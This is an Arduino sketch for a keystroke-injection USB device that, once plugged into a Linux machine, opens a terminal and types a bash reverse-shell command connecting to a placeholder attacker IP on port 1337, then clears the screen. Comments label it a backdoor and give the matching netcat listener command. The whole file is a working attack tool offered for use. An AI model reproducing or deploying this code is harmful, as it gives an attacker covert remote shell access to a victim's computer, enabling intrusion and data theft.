int flag=0;
void setup()
{
  int buttonPin = 2;
  pinMode(buttonPin, INPUT);  // Set the button as an input
  digitalWrite(buttonPin, HIGH);
 Keyboard.begin(); // Pull the button high
}
 
void loop()
{
             
  if (flag==0) // if the button goes low
  {
   
    delay(2000);
    //Opens shell and initializes backdoor at port 1337
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    Keyboard.releaseAll();
    delay(2000);
    //The ip address can be remote or local
    //Set up listener with $ nc -l -n -vv -p 1337
    Keyboard.print("/bin/bash -i > /dev/tcp/yourip/1337 0<&1 2>&1 && clear"); //Change yourip to your ip address
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
   
   
   
    flag=1;
     
  }}